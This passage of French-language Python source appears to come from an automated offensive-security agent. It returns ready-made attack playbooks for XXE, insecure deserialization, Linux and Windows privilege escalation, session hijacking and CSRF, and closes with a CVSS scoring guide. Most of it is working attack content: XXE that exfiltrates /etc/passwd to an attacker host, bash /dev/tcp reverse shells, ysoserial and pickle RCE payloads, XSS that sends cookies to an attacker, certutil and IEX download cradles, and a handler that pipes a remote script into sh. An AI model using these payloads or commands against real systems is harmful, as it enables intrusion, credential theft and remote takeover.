            "<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n"
            "<!ENTITY xxe SYSTEM \"http://localhost:6379/\">\n\n"
            "BLIND XXE (Out-Of-Band via DNS/HTTP) :\n\n"
            "─ Payload principal (injecté dans la requête) ─\n"
            "<!DOCTYPE foo [\n"
            f"  <!ENTITY % xxe SYSTEM \"http://{attacker_ip}/evil.dtd\">\n"
            "  %xxe;\n"
            "]>\n\n"
            f"─ evil.dtd sur {attacker_ip} ─\n"
            "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
            "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM "
            f"'http://{attacker_ip}/?x=%file;'>\">\n"
            "%eval;\n"
            "%exfil;\n\n"
            f"# Serveur pour catcher : python3 -m http.server 80\n"
            f"# ou : nc -lvnp 80\n\n"
            "XXE VIA DOCX/XLSX/SVG/PDF :\n"
            "  DOCX/XLSX : ces formats ZIP contiennent des XMLs\n"
            "    unzip target.docx -d docx_folder\n"
            "    # Injecter XXE dans docx_folder/word/document.xml\n"
            "    zip -r modified.docx docx_folder\n\n"
            "  SVG (upload d'image) :\n"
            "    <?xml version=\"1.0\"?>\n"
            "    <!DOCTYPE svg [\n"
            "      <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
            "    ]>\n"
            "    <svg xmlns='http://www.w3.org/2000/svg'><text>&xxe;</text></svg>\n\n"
            "DÉTECTION :\n"
            "  Burp Collaborator / Interactsh pour OOB callbacks\n"
            "  Chercher : parseurs XML, upload XML/DOCX, SOAP, SVG, PDF\n\n"
            "REMÉDIATION :\n"
            "  PHP    : libxml_disable_entity_loader(true)\n"
            "  Java   : XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES = false\n"
            "  Python : defusedxml à la place de xml.etree.ElementTree\n"
            "  .NET   : XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit",
            {"domain": "xxe", "attacker": attacker_ip})

    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 13 — DÉSÉRIALISATION
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_deserialize(self, task: str) -> dict:
        t = task.lower()
        lhost = self._extract_ip(task) or "10.10.10.10"
        lport = self._extract_port(task) or "4444"

        if any(kw in t for kw in ["java", "ysoserial"]):
            return self._result(True,
                "💣 DÉSÉRIALISATION JAVA — ysoserial / gadget chains\n\n"
                "IDENTIFIER LA VULNÉRABILITÉ :\n"
                "  Content-Type: application/x-java-serialized-object\n"
                "  Magic bytes : AC ED 00 05 (hex) = rO0AB (base64)\n"
                "  Ports Java : RMI (1099), JMX (9010), AMF (8400)\n\n"
                "YSOSERIAL — générer des payloads :\n"
                f"  java -jar ysoserial.jar CommonsCollections6 'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' | base64\n\n"
                "GADGET CHAINS COMMUNES :\n"
                "  CommonsCollections1/3/5/6 → Apache Commons Collections\n"
                "  Spring1/Spring2           → Spring Framework\n"
                "  Hibernate1/Hibernate2     → Hibernate ORM\n"
                "  URLDNS                    → test OOB (safe, juste DNS)\n"
                "  JRMPClient                → RMI exploit\n\n"
                "ATTAQUE RMI :\n"
                "  # JRMP listener + payload\n"
                f"  java -cp ysoserial.jar ysoserial.exploit.JRMPListener {lport} CommonsCollections6 'cmd'\n"
                f"  java -jar ysoserial.jar JRMPClient {lhost}:{lport}\n\n"
                "SPRING BOOT ACTUATOR (/env + /restart) :\n"
                "  POST /actuator/env → injecter spring.cloud.bootstrap.location\n"
                "  POST /actuator/refresh → déclencher désérialisation\n\n"
                "REMÉDIATION :\n"
                "  ObjectInputFilter (Java 9+) pour whitelist de classes\n"
                "  Mettre à jour Commons Collections\n"
                "  Désactiver la désérialisation native si possible",
                {"domain": "deserialize", "lang": "java", "lhost": lhost, "lport": lport})

        if "php" in t:
            return self._result(True,
                "💣 DÉSÉRIALISATION PHP — unserialize()\n\n"
                "IDENTIFIER :\n"
                "  Cookies ou paramètres qui contiennent : O:4:\"User\":2:{...}\n"
                "  Fonctions vulnérables : unserialize(), __wakeup(), __destruct()\n\n"
                "PAYLOAD BASIQUE :\n"
                "  class Shell {\n"
                "    public $cmd;\n"
                "    function __destruct() { system($this->cmd); }\n"
                "  }\n"
                "  $obj = new Shell();\n"
                "  $obj->cmd = 'id';\n"
                "  echo serialize($obj);\n"
                "  // → O:5:\"Shell\":1:{s:3:\"cmd\";s:2:\"id\";}\n\n"
                "PHAR DESERIALIZE (upload + read) :\n"
                "  $phar = new Phar('evil.phar');\n"
                "  $phar->startBuffering();\n"
                "  $phar->addFromString('test.txt', 'test');\n"
                "  $phar->setStub('<?php __HALT_COMPILER(); ?>');\n"
                "  $phar->setMetadata($obj);  // objet malveillant\n"
                "  $phar->stopBuffering();\n"
                "  # Renommer en .jpg et uploader\n"
                "  # Déclencher via : file_exists('phar://uploads/evil.jpg')\n\n"
                "PHPGGC — générateur de gadget chains PHP :\n"
                "  ./phpggc -l                           → lister toutes les chains\n"
                "  ./phpggc Laravel/RCE5 system 'id'    → Laravel gadget\n"
                "  ./phpggc Symfony/RCE4 system 'id'    → Symfony gadget\n\n"
                "REMÉDIATION :\n"
                "  Remplacer unserialize() par json_decode()\n"
                "  Whitelist de classes autorisées\n"
                "  Valider et signer les données sérialisées",
                {"domain": "deserialize", "lang": "php"})

        if "python" in t or "pickle" in t:
            lhost2 = lhost; lport2 = lport
            return self._result(True,
                "💣 DÉSÉRIALISATION PYTHON — pickle\n\n"
                "IDENTIFIER :\n"
                "  Tout appel à pickle.loads() sur des données non-fiables\n"
                "  Magic bytes pickle : \\x80\\x04\\x95 (protocole 4)\n\n"
                "PAYLOAD RCE :\n"
                "import pickle, os, base64\n\n"
                "class Exploit(object):\n"
                "    def __reduce__(self):\n"
                f"        return (os.system, ('bash -c \"bash -i >& /dev/tcp/{lhost2}/{lport2} 0>&1\"',))\n\n"
                "payload = pickle.dumps(Exploit())\n"
                f"print(base64.b64encode(payload).decode())\n\n"
                "# Sur la cible :\n"
                "# pickle.loads(base64.b64decode('<votre_payload>'))\n\n"
                "VARIANTE avec exec() :\n"
                "class Exploit(object):\n"
                "    def __reduce__(self):\n"
                "        return (exec, ('import os;os.system(\"id\")',))\n\n"
                "REMÉDIATION :\n"
                "  Ne jamais faire pickle.loads() sur des données réseau\n"
                "  Utiliser json, msgpack, ou Protocol Buffers\n"
                "  Si pickle obligatoire : HMAC pour signature",
                {"domain": "deserialize", "lang": "python", "lhost": lhost, "lport": lport})

        return self._result(True,
            "💣 DÉSÉRIALISATION — Langages couverts\n\n"
            "  java deserialization  → ysoserial, gadget chains (CommonsCollections, Spring)\n"
            "  php unserialize       → PHPGGC, magic methods __destruct/__wakeup\n"
            "  python pickle         → __reduce__ payload RCE\n"
            "  .net deserialization  → Json.NET TypeNameHandling, BinaryFormatter\n\n"
            "Précise le langage pour le payload complet.",
            {"domain": "deserialize"})

    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 14 — PRIVILEGE ESCALATION (Linux & Windows)
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_privesc(self, task: str) -> dict:
        t = task.lower()

        # LinPEAS — lancer directement
        if any(kw in t for kw in ["linpeas"]):
            cmd = "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
            result = self._run_command(cmd, task)
            if not result.get("success"):
                local_cmd = "bash /tmp/linpeas.sh 2>/dev/null || wget -qO /tmp/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x /tmp/linpeas.sh && bash /tmp/linpeas.sh"
                return self._run_command(local_cmd, task)
            return result

        # WinPEAS — info + download
        if "winpeas" in t:
            return self._result(True,
                "🔺 WINPEAS — Windows Privilege Escalation Awesome Script\n\n"
                "TÉLÉCHARGEMENT :\n"
                "  cmd> certutil -urlcache -f http://<ATTACKER>/winpeas.exe winpeas.exe\n"
                "  PS>  Invoke-WebRequest -Uri http://<ATTACKER>/winpeas.exe -OutFile wp.exe\n"
                "  PS>  IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER>/winpeas.ps1')\n\n"
                "EXÉCUTION :\n"
                "  winpeas.exe                  → tout scanner\n"
                "  winpeas.exe quiet            → sans couleurs (logs)\n"
                "  winpeas.exe systeminfo       → infos système\n"
                "  winpeas.exe servicesinfo     → services vulnérables\n"
                "  winpeas.exe userinfo         → utilisateurs/groupes\n\n"
                "VERSIONS :\n"
                "  winPEASx64.exe / winPEASx86.exe / winPEAS.bat / winPEAS.ps1\n"
                "  https://github.com/peass-ng/PEASS-ng/releases",
                {"domain": "privesc", "os": "windows", "tool": "winpeas"})

        # SUID
        if any(kw in t for kw in ["suid", "suid bit"]):
            cmd = "find / -perm -4000 -type f 2>/dev/null"
            result = self._run_command(cmd, task)
            # Ajouter gtfobins hint
            out = result.get("output", "") + (
                "\n\n🔗 GTFOBins — exploitation SUID :\n"
                "  https://gtfobins.github.io/?q=&type=suid\n\n"
                "COMMANDES COURANTES EXPLOITABLES :\n"
                "  bash   → bash -p\n"
                "  find   → find . -exec /bin/bash -p \\;\n"
                "  vim    → :!bash\n"
                "  python → python3 -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'\n"
                "  cp     → cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p\n"
                "  nmap   → nmap --interactive → !sh (version ancienne)"
            )
            return self._result(result.get("success", True), out, {"domain": "privesc", "check": "suid"})

        # sudo -l
        if any(kw in t for kw in ["sudo", "sudo -l"]):
            result = self._run_command("sudo -l 2>/dev/null", task)
            out = result.get("output", "") + (
                "\n\n🔗 GTFOBins — exploitation sudo :\n"
                "  https://gtfobins.github.io/?q=&type=sudo\n\n"
                "PATTERNS DANGEREUX :\n"
                "  (ALL) NOPASSWD: ALL              → sudo bash\n"
                "  (ALL) /bin/vim                   → sudo vim -c ':!bash'\n"
                "  (ALL) /usr/bin/python*           → sudo python -c 'import os; os.system(\"/bin/bash\")'\n"
                "  (ALL) /usr/bin/find              → sudo find / -exec bash -i \\; -quit\n"
                "  (ALL) /bin/cp                    → copier /bin/bash avec SUID\n"
                "  (user) /usr/bin/awk              → sudo awk 'BEGIN {system(\"/bin/bash\")}'"
            )
            return self._result(result.get("success", True), out, {"domain": "privesc", "check": "sudo"})

        # Capabilities
        if any(kw in t for kw in ["getcap", "capabilities"]):
            result = self._run_command("getcap -r / 2>/dev/null", task)
            out = result.get("output", "") + (
                "\n\nCAPACITÉS DANGEREUSES :\n"
                "  cap_setuid   → élévation directe\n"
                "  cap_net_raw  → sniffing réseau\n"
                "  cap_sys_admin→ montage, namespaces\n"
                "  python3 cap_setuid+ep → python3 -c \"import os; os.setuid(0); os.execl('/bin/sh', 'sh')\""
            )
            return self._result(result.get("success", True), out, {"domain": "privesc", "check": "capabilities"})

        # Cron writable
        if any(kw in t for kw in ["cron", "writable cron"]):
            cmd = "cat /etc/crontab 2>/dev/null; ls /etc/cron* 2>/dev/null; find / -writable -name '*.sh' 2>/dev/null | head -20"
            return self._run_command(cmd, task)

        # Windows — Token impersonation / Potatoes
        if any(kw in t for kw in ["token impersonation", "juicy potato", "printspoofer", "sweet potato", "rogue potato"]):
            return self._result(True,
                "🔺 WINDOWS PRIVESC — Token Impersonation & Potatoes\n\n"
                "PRÉREQUIS : SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege\n"
                "  whoami /priv → vérifier les privilèges\n\n"
                "PRINTSPOOFER (Windows 10/2019, le plus fiable) :\n"
                "  PrintSpoofer.exe -i -c cmd\n"
                "  PrintSpoofer.exe -c \"nc.exe 10.10.10.10 4444 -e cmd\"\n\n"
                "JUICY POTATO (Windows 2019 et avant) :\n"
                "  JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {CLSID}\n"
                "  # CLSID : https://github.com/ohpe/juicy-potato/tree/master/CLSID\n\n"
                "SWEET POTATO / ROGUE POTATO (Win10 patché) :\n"
                "  SweetPotato.exe -a \"whoami\"\n\n"
                "ALWAYS INSTALL ELEVATED :\n"
                "  reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
                "  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
                "  # Si 0x1 :\n"
                "  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi\n"
                "  msiexec /quiet /qn /i evil.msi\n\n"
                "UNQUOTED SERVICE PATHS :\n"
                "  wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\"\n"
                "  # Si chemin non quoté avec espace → placer executable dans chemin tronqué",
                {"domain": "privesc", "os": "windows"})

        # Guide complet
        checklist = (
            "🔺 PRIVILEGE ESCALATION — Checklist\n\n"
            "LINUX :\n"
            "  linpeas              → scan automatique complet\n"
            "  sudo -l              → commandes sudo sans mot de passe\n"
            "  suid bit             → find / -perm -4000 -type f 2>/dev/null\n"
            "  getcap linux         → getcap -r / 2>/dev/null\n"
            "  writable cron        → cat /etc/crontab; find / -writable -name '*.sh'\n"
            "  /etc/passwd writable → ajouter root2::\n"
            "  /etc/shadow read     → hashcat sur les hashes\n"
            "  docker group         → docker run -v /:/mnt ubuntu chroot /mnt sh\n"
            "  lxd group            → monter le filesystem complet\n"
            "  NFS no_root_squash   → monter + créer SUID\n"
            "  kernel exploit       → searchsploit $(uname -r)\n\n"
            "WINDOWS :\n"
            "  winpeas              → scan automatique complet\n"
            "  token impersonation  → PrintSpoofer, JuicyPotato, SweetPotato\n"
            "  always install elevated → MSI payload SYSTEM\n"
            "  unquoted service paths → exe dans chemin tronqué\n"
            "  weak service perms   → accesschk.exe → changer binPath\n"
            "  AutoRuns             → DLL hijacking via startup\n"
            "  SAM/SYSTEM dump      → reg save HKLM\\SAM /tmp/sam.hive\n"
            "  SeDebugPrivilege     → inject SYSTEM process\n\n"
            "Précise le contexte (linpeas / winpeas / suid / sudo / cron / token) pour lancer."
        )
        return self._result(True, checklist, {"domain": "privesc"})

    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 15 — SESSION HIJACKING & CSRF
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_session_hijack(self, task: str) -> dict:
        t = task.lower()
        attacker = self._extract_ip(task) or "10.10.10.10"

        if any(kw in t for kw in ["csrf", "forged request"]):
            return self._result(True,
                "💣 CSRF — Cross-Site Request Forgery\n\n"
                "DÉTECTION :\n"
                "  Absence de token CSRF dans les formulaires/requêtes\n"
                "  Vérifier : X-CSRF-Token, CSRF_TOKEN, _token, authenticity_token\n"
                "  Tester : changer la méthode GET/POST, supprimer le token, rejouer\n\n"
                "PAYLOAD HTML (changement d'email) :\n"
                "<html><body>\n"
                "  <form action=\"https://victim.com/account/email\" method=\"POST\">\n"
                "    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n"
                "    <input type=\"submit\" value=\"Click\">\n"
                "  </form>\n"
                "  <script>document.forms[0].submit();</script>\n"
                "</body></html>\n\n"
                "CSRF JSON (si Content-Type: text/plain accepté) :\n"
                "<form method=\"POST\" action=\"https://victim.com/api/update\"\n"
                "      enctype=\"text/plain\">\n"
                "  <input name='{\"email\":\"x@evil.com\",\"x\":\"' value=\"'}\">\n"
                "</form>\n\n"
                "CSRF + fetch (si cookie SameSite=None) :\n"
                "<script>\n"
                "fetch('https://victim.com/account/email', {\n"
                "  method: 'POST',\n"
                "  credentials: 'include',\n"
                "  headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n"
                "  body: 'email=attacker@evil.com'\n"
                "});\n"
                "</script>\n\n"
                "REMÉDIATION :\n"
                "  Token CSRF synchronisé (double submit cookie)\n"
                "  SameSite=Strict sur les cookies de session\n"
                "  Vérification de l'en-tête Origin/Referer",
                {"domain": "session", "attack": "csrf"})

        if any(kw in t for kw in ["cookie", "session fixation", "vol de session", "vol de cookie"]):
            return self._result(True,
                "💣 SESSION HIJACKING & COOKIE THEFT\n\n"
                "VOL DE COOKIE VIA XSS :\n"
                f"<script>document.location='http://{attacker}/steal?c='+document.cookie</script>\n"
                f"<img src=x onerror=\"fetch('http://{attacker}/?c='+document.cookie)\">\n"
                f"<svg onload=\"new Image().src='http://{attacker}/?'+document.cookie\">\n\n"
                f"SERVEUR POUR CATCHER :\n"
                f"  nc -lvnp 80     # ou python3 -m http.server 80\n\n"
                "SESSION FIXATION :\n"
                "  1. Obtenir un session ID valide (avant login)\n"
                "  2. Forcer la victime à utiliser ce session ID :\n"
                "     http://victim.com/login?PHPSESSID=attacker_controlled_id\n"
                "  3. Quand la victime se connecte, le session ID est recyclé\n"
                "     si l'appli ne régénère pas le session ID post-login\n\n"
                "ANALYSE DE COOKIES :\n"
                "  Flags manquants à tester :\n"
                "    HttpOnly absent → vol via XSS\n"
                "    Secure absent   → interception HTTP\n"
                "    SameSite absent → CSRF possible\n\n"
                "  Vérifier l'entropie :\n"
                "    hashcat --show -m 0 <cookie>  → préfixe connu ?\n"
                "    python3 -c \"import base64; print(base64.b64decode('<cookie>'))\"  → données sérialisées ?\n\n"
                "TOKEN REPLAY :\n"
                "  JWT expiré → modifier exp dans payload, re-signer avec alg:none\n"
                "  Bearer token → rejouer dans Burp / curl\n"
                "  OAuth refresh_token → persiste souvent > 30 jours\n\n"
                "OUTILS :\n"
                "  Burp Suite → Repeater pour rejouer les requêtes\n"
                "  EditThisCookie (extension) → modifier les cookies\n"
                "  jwt.io / jwt_tool → décoder et modifier les JWT",
                {"domain": "session", "attack": "hijacking"})

        return self._result(True,
            "💣 SESSION HIJACKING — Techniques\n\n"
            "  csrf attack          → forger des requêtes authentifiées\n"
            "  cookie stealing      → XSS → vol de cookie → usurpation\n"
            "  session fixation     → forcer un session ID connu\n"
            "  token replay         → rejouer JWT/OAuth/Bearer\n\n"
            "Précise la technique pour le code complet.",
            {"domain": "session"})

    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 16 — CVSS SCORING (v3.1 & v4.0)
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_cvss(self, task: str) -> dict:
        t = task.lower()
        is_v4 = "v4" in t or "cvss 4" in t
        version = "4.0" if is_v4 else "3.1"
        return self._result(True,
            f"📊 CVSS {version} — CALCULATEUR DE SCORE\n\n"
            + ("CVSS v4.0 (2023) — NOUVEAUTÉS vs v3.1 :\n"
               "  4 types de scores : Base / Threat / Environmental / Supplemental\n"
               "  Nomenclature : CVSS-BT (Base+Threat), CVSS-BE (Base+Environmental)\n"
               "  Attack Requirements (AR) remplace Attack Complexity (AC)\n"
               "  Nouvelles métriques : Provider Urgency, Recovery, Safety\n\n"
               if is_v4 else "") +
            "VECTEUR DE BASE (CVSS v3.1) :\n\n"
            "  AV  Attack Vector      : N(etwork)/A(djacent)/L(ocal)/P(hysical)\n"
            "  AC  Attack Complexity  : L(ow)/H(igh)\n"
            "  PR  Privileges Required: N(one)/L(ow)/H(igh)\n"
            "  UI  User Interaction   : N(one)/R(equired)\n"
            "  S   Scope              : U(nchanged)/C(hanged)\n"
            "  C   Confidentiality    : N(one)/L(ow)/H(igh)\n"
            "  I   Integrity          : N(one)/L(ow)/H(igh)\n"
            "  A   Availability       : N(one)/L(ow)/H(igh)\n\n"
            "SCORES DE SÉVÉRITÉ :\n"
            "  0.0        → None\n"
            "  0.1 – 3.9  → Low\n"
            "  4.0 – 6.9  → Medium\n"
            "  7.0 – 8.9  → High\n"
            "  9.0 – 10.0 → Critical\n\n"
            "EXEMPLES DE VECTEURS :\n"
            "  RCE remote non-auth, pas de UI, haute impact :\n"
            "    CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H → 10.0 Critical\n\n"
            "  SQLi avec accès réseau, auth requise :\n"
            "    CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N → 8.1 High\n\n"
            "  XSS stored, user interaction requise :\n"
            "    CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N → 6.1 Medium\n\n"
            "  LFI local, accès limité :\n"
            "    CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N → 6.5 Medium\n\n"
            "CALCULATEURS :\n"
            "  https://www.first.org/cvss/calculator/3.1\n"
            "  https://www.first.org/cvss/calculator/4.0\n"
            "  nvd.nist.gov → base de CVEs avec scores officiels\n\n"
            "CVSS TEMPOREL (optionnel) :\n"
            "  E  Exploit Code Maturity : U/P/F/H\n"
            "  RL Remediation Level     : O/T/W/U\n"
            "  RC Report Confidence     : U/R/C\n\n"
            "POUR CALCULER : donne-moi les métriques AV/AC/PR/UI/S/C/I/A\n"
            "et je calcule le score exact.",
            {"domain": "cvss", "version": version})


cyber_agent = CyberAgent()
